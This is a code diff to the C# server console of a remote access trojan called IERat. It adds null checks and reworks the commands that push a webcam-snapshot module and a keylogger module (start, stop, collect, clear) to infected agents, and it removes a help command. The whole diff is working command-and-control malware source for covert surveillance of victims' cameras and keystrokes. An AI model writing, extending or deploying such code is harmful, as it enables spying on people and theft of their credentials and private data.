@@ -20,7 +20,7 @@ namespace IERatServer
             Prompt = ColoredString.FromString("IERat$ ")
         };
         public static Loop loop = new(typeof(MyCommandType), ioParams);
-        public static int InteractContext = 1;
+        public static int InteractContext = 999;
         public static int TimeOutSeconds = 30;
         enum MyCommandType
         {
@@ -83,9 +83,6 @@ namespace IERatServer
 
             [Command(typeof(CopyCommand), Description = "Copy a file")]
             cp,
-
-            [Command(typeof(HelpCommand), Description = "Display help")]
-            help,
 
             [Command(typeof(ExitCommand2), Description = "Exits the shell")]
             exit
@@ -172,26 +169,30 @@ namespace IERatServer
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
-                var agent = ActiveChannel.agent;
-                try
+                if (ActiveChannel != null)
                 {
-                    if (agent.LoadedModules.ContainsKey("camsnapshot"))
+                    var agent = ActiveChannel.agent;
+                    try
                     {
-                        AddTaskToActiveAgent("camsnapshot", "");
+                        if (agent.LoadedModules.ContainsKey("camsnapshot"))
+                        {
+                            AddTaskToActiveAgent("camsnapshot", "");
+                        }
+                        else
+                        {
+                            var CameraModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "CameraModule.dll"));
+                            AddTaskToActiveAgent("camsnapshot", Convert.ToBase64String(ServerUtils.Compress(CameraModule)));
+                            agent.LoadedModules.Add("camsnapshot", null);
+                        }
                     }
-                    else
+                    catch
                     {
-                        var CameraModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "CameraModule.dll"));
-                        AddTaskToActiveAgent("camsnapshot", Convert.ToBase64String(ServerUtils.Compress(CameraModule)));
-                        agent.LoadedModules.Add("camsnapshot", null);
+                        Console.WriteLine("Error - Unable to load webcam module - CameraModule.dll was not found in Modules folder");
+                        Logger.Log("error", "Unable to load webcam module - CameraModule.dll was not found in Modules folder");
                     }
+                    return Task.FromResult(CommandResult.Success);
                 }
-                catch
-                {
-                    Console.WriteLine("Error - Unable to load webcam module - CameraModule.dll was not found in Modules folder");
-                    Logger.Log("error", "Unable to load webcam module - CameraModule.dll was not found in Modules folder");
-                }
-                return Task.FromResult(CommandResult.Success);
+            return Task.FromResult(CommandResult.Success);
             }
         }
         class ChromeCommand : Command
@@ -233,48 +234,54 @@ namespace IERatServer
         }
         class KeyloggerCommand : Command
         {
-            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "keylogger opertation")]
+            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "The keylogger operation. Options: start, stop, collect, clear.")]
             public string Operation { get; set; }
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
-                var agent = ActiveChannel.agent;
-
-                switch (Operation)
+                if (ActiveChannel != null)
                 {
-                    case "start":
-                        if (agent.LoadedModules.ContainsKey("klog"))  {
-                            AddTaskToActiveAgent("klog_start", "");
-                        }
-                        else
-                        {
-                            try
+                    var agent = ActiveChannel.agent;
+                    switch (Operation)
+                    {
+                        case "start":
+                            if (agent.LoadedModules.ContainsKey("klog"))
                             {
-                                var KlogModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "KeyLogModule.dll"));
-                                AddTaskToActiveAgent("klog_start", Convert.ToBase64String(ServerUtils.Compress(KlogModule)));
-                                agent.LoadedModules.Add("klog", null);
+                                AddTaskToActiveAgent("klog_start", "");
                             }
-                            catch
+                            else
                             {
-                                Console.WriteLine("Error - Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
-                                Logger.Log("error", "Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
+                                try
+                                {
+                                    var KlogModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "KeyLogModule.dll"));
+                                    AddTaskToActiveAgent("klog_start", Convert.ToBase64String(ServerUtils.Compress(KlogModule)));
+                                    agent.LoadedModules.Add("klog", null);
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("Error - Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
+                                    Logger.Log("error", "Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
+                                }
                             }
-                        }
-                        return Task.FromResult(CommandResult.Success);
-                    case "stop":
-                        AddTaskToActiveAgent("klog_stop");
-                        agent.LoadedModules.Remove("klog");
-                        return Task.FromResult(CommandResult.Success);
-                    case "collect":
-                        AddTaskToActiveAgent("klog_collect");
-                        return Task.FromResult(CommandResult.Success);
-                    case "clear":
-                        AddTaskToActiveAgent("klog_clear");
-                        return Task.FromResult(CommandResult.Success);
-                    default:
-                        CLI.ScreenMessage("Bad keylogger operation choice");
-                        return Task.FromResult(CommandResult.Success);
+                            return Task.FromResult(CommandResult.Success);
+                        case "stop":
+                            AddTaskToActiveAgent("klog_stop");
+                            agent.LoadedModules.Remove("klog");
+                            return Task.FromResult(CommandResult.Success);
+                        case "collect":
+                            AddTaskToActiveAgent("klog_collect");
+                            return Task.FromResult(CommandResult.Success);
+                        case "clear":
+                            AddTaskToActiveAgent("klog_clear");
+                            return Task.FromResult(CommandResult.Success);
+                        default:
+                            System.Console.ForegroundColor = ConsoleColor.Blue;
+                            Console.WriteLine("Error - Bad operation choice. Options are: start, stop, collect, clear.");
+                            System.Console.ForegroundColor = ConsoleColor.White;
+                            return Task.FromResult(CommandResult.Success);
+                    }
                 }
+                return Task.FromResult(CommandResult.Success);
             }
         }
         class DownloadCommand : Command
